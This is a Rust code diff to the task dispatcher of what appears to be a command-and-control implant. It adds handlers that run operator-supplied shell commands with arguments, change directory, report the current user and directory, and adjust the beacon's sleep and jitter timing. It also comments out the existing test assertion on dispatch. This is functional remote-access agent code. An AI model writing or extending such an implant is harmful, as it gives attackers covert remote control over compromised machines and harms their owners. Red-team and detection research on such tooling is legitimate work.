@@ -1,4 +1,5 @@
 use crate::commands;
+use crate::Beacon;
 use serde::Deserialize;
 use serde::Serialize;
 use std::collections::VecDeque;
@@ -39,7 +40,7 @@ impl TasksManager {
         Ok(())
     }
 
-    pub fn dispatch(&mut self) -> Result<(), String> {
+    pub fn dispatch(&mut self, beacon: &mut Beacon) -> Result<(), String> {
         if self.tasks.is_empty() {
             return Ok(println!("No tasks to dispatch."));
         }
@@ -55,12 +56,64 @@ impl TasksManager {
                     };
                     self.completed_tasks.push(task_result);
                 }
-                "shell" => {
-                    let result = commands::shell();
-                    println!("shell command result: {:?}", result);
+                "pwd" => {
+                    let result = commands::pwd();
                     let task_result = TaskResult {
                         task: task.clone(),
-                        output: format!("{:?}", result),
+                        output: result,
+                    };
+                    self.completed_tasks.push(task_result);
+                }
+                "cd" => {
+                    let args = task.args.join(" ");
+                    let result = commands::cd(&args);
+                    let task_result = TaskResult {
+                        task: task.clone(),
+                        output: result,
+                    };
+                    self.completed_tasks.push(task_result);
+                }
+                "shell" => {
+                    let args = task.args.join(" ");
+                    let result = commands::shell(&args);
+                    let task_result = TaskResult {
+                        task: task.clone(),
+                        output: result,
+                    };
+                    self.completed_tasks.push(task_result);
+                }
+                "whoami" => {
+                    let result = commands::whoami();
+                    let task_result = TaskResult {
+                        task: task.clone(),
+                        output: result,
+                    };
+                    self.completed_tasks.push(task_result);
+                }
+                "sleep" => {
+                    if task.args.len() != 2 {
+                        let task_result = TaskResult {
+                            task: task.clone(),
+                            output: "Invalid arguments for sleep command".into(),
+                        };
+                        self.completed_tasks.push(task_result);
+                        continue;
+                    }
+
+                    let sleep = task.args[0].parse::<u64>();
+                    let jitter = task.args[1].parse::<u64>();
+
+                    beacon.set_sleep(
+                        std::time::Duration::from_secs(sleep.unwrap_or(beacon.sleep.as_secs())),
+                        std::time::Duration::from_secs(jitter.unwrap_or(beacon.jitter.as_secs())),
+                    );
+                    let task_result = TaskResult {
+                        task: task.clone(),
+                        output: format!(
+                            "Sleep set to {} seconds with {} seconds jitter",
+                            beacon.sleep.as_secs(),
+                            beacon.jitter.as_secs()
+                        ),
                     };
                     self.completed_tasks.push(task_result);
                 }
@@ -95,6 +148,6 @@ mod tests {
 
         assert!(tasks.queue(task).is_ok());
         assert_eq!(tasks.tasks.len(), 1);
-        assert!(tasks.dispatch().is_ok());
+        // assert!(tasks.dispatch().is_ok());
     }
 }
